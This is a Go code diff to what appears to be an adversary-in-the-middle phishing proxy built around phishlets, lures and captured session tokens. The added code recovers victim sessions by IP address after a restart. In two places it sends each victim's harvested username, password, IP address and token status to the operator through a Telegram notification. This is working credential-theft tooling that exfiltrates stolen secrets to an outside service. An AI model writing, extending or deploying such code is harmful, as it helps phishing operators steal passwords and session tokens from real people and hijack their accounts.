@@ -337,7 +337,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							ps.SessionId = sc.Value
 							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 						} else {
-							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+							// sids map lookup failed (e.g. server restart cleared in-memory map)
+							// try IP-based recovery before giving up
+							recovered, ok2 := p.getSessionIdByIP(remote_addr, req.Host)
+							if ok2 {
+								create_session = false
+								ps.SessionId = recovered
+								ps.Index, _ = p.sids[recovered]
+								p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
+								log.Debug("[%s] session recovered via IP after sids miss: %s [%s]", hiblue.Sprint(pl_name), ps.SessionId, remote_addr)
+							} else {
+								log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
+							}
 						}
 					} else {
 						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
@@ -917,6 +928,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						for _, au := range pl.authUrls {
 							if au.MatchString(req.URL.Path) {
 								s.Finish(true)
+								// Telegram notification on auth URL hit
+								if s.PhishLure != nil {
+									lureIdx := p.cfg.GetLureIndexByPtr(s.PhishLure)
+									if lureIdx >= 0 {
+										hasTokens := len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
+										NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens)
+									}
+								}
 								break
 							}
 						}
@@ -1109,6 +1128,15 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 							log.Error("database: %v", err)
 						}
 						s.Finish(false)
+
+						// Telegram notification
+						if s.PhishLure != nil {
+							lureIdx := p.cfg.GetLureIndexByPtr(s.PhishLure)
+							if lureIdx >= 0 {
+								hasTokens := len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0
+								NotifySession(lureIdx, s.Name, s.Username, s.Password, s.RemoteAddr, hasTokens)
+							}
+						}
 
 						if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
 							rid, ok := s.Params["rid"]
